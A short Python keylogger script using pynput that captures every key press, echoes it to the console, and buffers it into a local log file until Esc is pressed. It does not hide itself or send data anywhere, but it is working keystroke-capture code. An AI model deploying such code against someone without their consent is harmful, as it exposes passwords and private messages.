from pynput.keyboard import Key, Listener
import datetime

log_file = 'keylog.txt'

count = 0
entry = 0
buffer_size = 20
keys = []

with open(log_file, 'w') as f:
    txt = f'Keylogging started at {datetime.datetime.now()} with buffer size of {buffer_size}.\n\n'
    f.write(txt)

def write(keys: list):
    with open(log_file, 'a') as f:
        for key in keys:
            f.write(key.strip('\''))
    keys.clear()

def pressed(key):
    global keys, count, entry
    key = str(key)
    key: str
    if key.find('Key') != -1:
        keys.append(f'[{key.replace('Key.', '').split(':')[0]}]')
    else:
        keys.append(f'[{key.strip('\'')}]')

    count += 1
    entry += 1
    print(keys[-1], end='', flush=True)

    if count >= buffer_size:
        write(keys)
        count = 0
        
def released(key):
    global keys
    if key == Key.esc:
        write(keys)
        return False

with Listener(on_press=pressed, on_release=released) as listener:
    listener.join()

with open(log_file, 'a') as f:
    txt = f'\n\nKeylogging ended at {datetime.datetime.now()} with entry size of {entry}.'
    f.write(txt)
